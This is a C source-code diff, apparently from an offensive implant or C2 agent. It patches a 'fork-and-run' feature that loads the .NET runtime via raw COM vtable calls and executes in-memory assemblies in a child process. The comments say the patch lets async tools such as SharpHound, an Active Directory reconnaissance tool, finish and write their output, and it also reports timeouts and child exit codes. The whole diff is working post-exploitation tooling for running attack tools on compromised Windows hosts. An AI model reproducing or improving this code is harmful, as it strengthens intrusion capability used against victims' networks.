@@ -268,6 +268,91 @@ typedef struct {
     HRESULT    hr;
 } InvokeWork;
 
+// Reflection invokes an async managed entry point as a normal method.  When
+// Main returns Task, MethodInfo.Invoke returns as soon as the first await is
+// reached; killing the CLR child at that point truncates SharpHound after its
+// schema discovery and no ZIP is ever written.  Wait for the returned Task
+// through its COM dispatch surface before reporting the task complete.
+static const GUID IID_IDispatch_ =
+    {0x00020400,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}};
+static const GUID IID_NULL_ =
+    {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}};
+
+typedef HRESULT (WINAPI *pfnGetIDsOfNames)(void*, const GUID*, LPOLESTR*,
+                                           UINT, LCID, DISPID*);
+typedef HRESULT (WINAPI *pfnDispatchInvoke)(void*, DISPID, const GUID*, LCID,
+                                            WORD, DISPPARAMS*, VARIANT*,
+                                            EXCEPINFO*, UINT*);
+typedef ULONG (WINAPI *pfnRelease)(void*);
+
+// Invoke one public parameterless method on a managed object exposed through
+// a COM callable wrapper.  The result is returned as a normal VARIANT so the
+// caller can chain GetAwaiter/GetResult when Wait is not exposed.
+static HRESULT dispatch_noargs(void *object, const WCHAR *method,
+                               OleVar16 *result) {
+    if (!object || !method || !result) return E_INVALIDARG;
+    memset(result, 0, sizeof(*result));
+    VariantInit((VARIANT*)result);
+
+    void *disp = NULL;
+    typedef HRESULT (WINAPI *pfnQI)(void*, const GUID*, void**);
+    HRESULT hr = ((pfnQI*)VTBL(object))[0](object, &IID_IDispatch_, &disp);
+    if (FAILED(hr) || !disp) return FAILED(hr) ? hr : E_NOINTERFACE;
+
+    LPOLESTR name = (LPOLESTR)method;
+    DISPID dispid = DISPID_UNKNOWN;
+    hr = ((pfnGetIDsOfNames*)VTBL(disp))[5](disp, &IID_NULL_, &name, 1,
+                                           LOCALE_SYSTEM_DEFAULT, &dispid);
+    if (SUCCEEDED(hr)) {
+        DISPPARAMS params;
+        memset(&params, 0, sizeof(params));
+        EXCEPINFO excep;
+        memset(&excep, 0, sizeof(excep));
+        UINT arg_err = 0;
+        hr = ((pfnDispatchInvoke*)VTBL(disp))[6](disp, dispid, &IID_NULL_,
+                                                  LOCALE_SYSTEM_DEFAULT,
+                                                  DISPATCH_METHOD, &params,
+                                                  (VARIANT*)result, &excep,
+                                                  &arg_err);
+        if (excep.bstrSource && g_sysFreeString) g_sysFreeString(excep.bstrSource);
+        if (excep.bstrDescription && g_sysFreeString) g_sysFreeString(excep.bstrDescription);
+        if (excep.bstrHelpFile && g_sysFreeString) g_sysFreeString(excep.bstrHelpFile);
+    }
+    ((pfnRelease*)VTBL(disp))[2](disp);
+    return hr;
+}
+
+// Return 1 when a Task was awaited, 0 for a synchronous/non-COM return value,
+// and -1 when a Task was detected but waiting failed.
+static int await_managed_task(OleVar16 *ret) {
+    if (!ret || (ret->vt != VT_UNKNOWN && ret->vt != VT_DISPATCH) || !ret->data)
+        return 0;
+
+    OleVar16 ignored;
+    HRESULT hr = dispatch_noargs((void*)ret->data, L"Wait", &ignored);
+    VariantClear((VARIANT*)&ignored);
+    if (SUCCEEDED(hr)) return 1;
+
+    // Some runtimes expose GetAwaiter but not Task.Wait through IDispatch.
+    // Calling GetResult also propagates an exception from the async entry
+    // point instead of letting the child exit while work is still pending.
+    OleVar16 awaiter;
+    hr = dispatch_noargs((void*)ret->data, L"GetAwaiter", &awaiter);
+    if (FAILED(hr)) {
+        VariantClear((VARIANT*)&awaiter);
+        return 0; // A synchronous method may legitimately return a COM object.
+    }
+    if ((awaiter.vt == VT_UNKNOWN || awaiter.vt == VT_DISPATCH) && awaiter.data) {
+        OleVar16 result;
+        HRESULT result_hr = dispatch_noargs((void*)awaiter.data, L"GetResult", &result);
+        VariantClear((VARIANT*)&result);
+        VariantClear((VARIANT*)&awaiter);
+        return SUCCEEDED(result_hr) ? 1 : -1;
+    }
+    VariantClear((VARIANT*)&awaiter);
+    return -1;
+}
+
 static DWORD WINAPI invoke_thread(LPVOID param) {
     InvokeWork *w = (InvokeWork*)param;
     typedef HRESULT (WINAPI *pfnInv3)(void*, OleVar16*, SAFEARRAY*, OleVar16*);
@@ -275,6 +360,11 @@ static DWORD WINAPI invoke_thread(LPVOID param) {
     memset(&objVar, 0, sizeof(objVar));
     memset(&retVar, 0, sizeof(retVar));
     w->hr = ((pfnInv3*)VTBL(w->pEP))[37](w->pEP, &objVar, w->saParams, &retVar);
+    if (SUCCEEDED(w->hr)) {
+        int awaited = await_managed_task(&retVar);
+        if (awaited < 0) w->hr = E_FAIL;
+    }
+    VariantClear((VARIANT*)&retVar);
     return 0;
 }
 
@@ -474,6 +564,18 @@ static void fork_write_le32(HANDLE h, DWORD v) {
     fork_write_all(h, b, 4);
 }
 
+static void append_output_marker(char **output, size_t *out_len, size_t *out_cap,
+                                 const char *marker) {
+    if (!output || !out_len || !out_cap || !marker) return;
+    size_t marker_len = strlen(marker);
+    char *tmp = (char*)realloc(*output, *out_len + marker_len + 1);
+    if (!tmp) return;
+    *output = tmp;
+    memcpy(*output + *out_len, marker, marker_len);
+    *out_len += marker_len;
+    (*output)[*out_len] = '\0';
+}
+
 typedef struct {
     HANDLE         h;
     const uint8_t *asm_bytes;
@@ -547,6 +649,7 @@ char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *ar
     DWORD timeout_ms = (timeout_sec >= 60 && timeout_sec <= 1800)
                      ? (DWORD)(timeout_sec * 1000) : 60000;
     DWORD  deadline = GetTickCount() + timeout_ms;
+    int timed_out = 0;
 
     while (GetTickCount() < deadline) {
         DWORD avail = 0;
@@ -588,24 +691,24 @@ char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *ar
 
     CloseHandle(out_rd);
     if (GetTickCount() >= deadline) {
+        timed_out = 1;
         TerminateProcess(pi.hProcess, 1);
-        {
-            char marker[96];
-            int marker_len = snprintf(marker, sizeof(marker),
-                                      "\n[!] fork-and-run timeout (%lus)",
-                                      (unsigned long)(timeout_ms / 1000));
-            if (marker_len > 0) {
-                char *tmp = (char*)realloc(output, out_len + (size_t)marker_len + 1);
-                if (tmp) {
-                    output = tmp;
-                    memcpy(output + out_len, marker, (size_t)marker_len);
-                    out_len += (size_t)marker_len;
-                    output[out_len] = '\0';
-                }
-            }
-        }
+        char marker[96];
+        snprintf(marker, sizeof(marker), "\n[!] fork-and-run timeout (%lus)",
+                 (unsigned long)(timeout_ms / 1000));
+        append_output_marker(&output, &out_len, &out_cap, marker);
     }
     WaitForSingleObject(pi.hProcess, 5000);
+    if (!timed_out) {
+        DWORD exit_code = 0;
+        if (GetExitCodeProcess(pi.hProcess, &exit_code) && exit_code != 0) {
+            char marker[96];
+            snprintf(marker, sizeof(marker),
+                     "\n[!] fork-and-run child exited with code %lu",
+                     (unsigned long)exit_code);
+            append_output_marker(&output, &out_len, &out_cap, marker);
+        }
+    }
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
 
     if (!output || out_len == 0) { free(output); return _strdup("(no output from child)"); }
